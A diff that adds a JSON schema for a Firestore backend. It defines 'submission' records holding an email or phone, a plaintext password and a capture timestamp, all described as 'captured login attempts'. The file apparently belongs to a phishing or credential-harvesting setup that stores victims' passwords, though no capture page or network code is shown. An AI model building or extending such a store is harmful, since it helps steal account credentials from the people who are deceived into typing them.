@@ -1,0 +1,31 @@
+{
+  "entities": {
+    "submission": {
+      "title": "Submission",
+      "description": "A captured login attempt including email and password.",
+      "type": "object",
+      "properties": {
+        "email": {
+          "type": "string",
+          "description": "The email or phone used."
+        },
+        "password": {
+          "type": "string",
+          "description": "The captures password."
+        },
+        "createdAt": {
+          "type": "string",
+          "format": "date-time",
+          "description": "Timestamp of capture."
+        }
+      },
+      "required": ["email", "password", "createdAt"]
+    }
+  },
+  "firestore": {
+    "submissions": {
+      "schema": "submission",
+      "description": "Collection of captured login attempts."
+    }
+  }
+}
